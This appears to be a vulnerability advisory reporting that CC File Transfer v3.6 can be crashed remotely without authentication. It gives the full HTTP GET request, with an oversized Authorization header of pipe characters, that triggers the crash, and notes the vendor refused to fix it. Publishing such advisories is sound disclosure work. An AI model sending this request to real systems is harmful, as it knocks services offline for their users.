# introduction

CC File Transfer is free web based file transfer software built for people that need to transfer files PC to PC regularly. It 
helps you ashare files, photos, music and video with your friends. This file transfer program eliminates the hassles of FTP 
and limitations of email file transfer especially for transferring large files. The simple interface makes transferring files 
as easy as dragging and dropping files. It can transfer files over the Internet or LAN/home network even transfer files from 
Windows to Linux / Mac OS. 

http://www.ccfile.net/index.htm

# affected programs & issues

CCFile Windows Binary - v3.6

Tested on:  
Windows XP Professional Service Pack 3  
Windows 7 Professional Service Pack 1  

The web-based software allows a malicious user to remotely crash the service without authentication

# discovery

author: sec.9emin1@gmail.com  
discovered by: sec.9emin1@gmail.com  

The vulnerabilities were discovered using the Peach Fuzzer Community Edition  
https://www.peach.tech

# issue demonstrationaa

The following HTTP GET request will crash the service remotely:    
```
GET /download.htm?file= HTTP/1.1
User-Agent: Mozilla/4.0
Host: 172.16.6.133:80
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Referer: http://172.16.6.133/
Authorization: Basic 
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
||||||||||||||||
Conection: Keep-Alive
```

# progress
 
080817 - Vendor Notified  
090817 - Vendor Acknowledged and responded with no intention to fix
